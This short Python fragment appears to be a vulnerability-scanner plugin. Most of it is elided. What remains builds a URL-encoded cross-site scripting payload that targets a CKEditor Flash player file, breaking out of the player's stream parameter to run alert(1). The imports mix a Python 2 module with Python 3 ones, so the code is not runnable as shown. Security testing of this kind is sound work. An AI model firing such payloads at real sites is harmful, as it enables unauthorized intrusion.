#!/usr/bin/env python
#coding = utf-8
import re,urllib.request,urllib.parse,urllib.error,md5
...
def audit(arg):
    ...
    payload = urllib.parse.unquote("statics/js/ckeditor/plugins/flashplayer/player/player.swf?skin=skin.swf%26stream%3D%5C%2522%29%29%7Dcatch%28e%29%7Balert%281%29%7D%2f%2f")
